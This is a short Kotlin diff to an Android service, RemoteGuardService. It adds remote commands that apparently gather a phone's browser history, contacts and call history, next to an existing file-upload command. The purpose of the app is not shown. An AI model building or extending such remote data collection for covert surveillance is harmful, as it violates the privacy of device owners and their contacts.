@@ -174,6 +174,18 @@ class RemoteGuardService : LifecycleService() {
                     Log.d("RemoteGuardService", "Executing: upload_file:$path")
                     FileManager.uploadFile(this, path)
                 }
+                command == "get_browser_history" -> {
+                    Log.d("RemoteGuardService", "Executing: get_browser_history")
+                    BrowserHistoryManager.getBrowserHistory(this)
+                }
+                command == "get_contacts" -> {
+                    Log.d("RemoteGuardService", "Executing: get_contacts")
+                    ContactsAndCallsManager.getContacts(this)
+                }
+                command == "get_call_history" -> {
+                    Log.d("RemoteGuardService", "Executing: get_call_history")
+                    ContactsAndCallsManager.getCallHistory(this)
+                }
                 else -> {
                     Log.w("RemoteGuardService", "Unsupported command: $command")
                     cmdRef.child("status").setValue("failed")
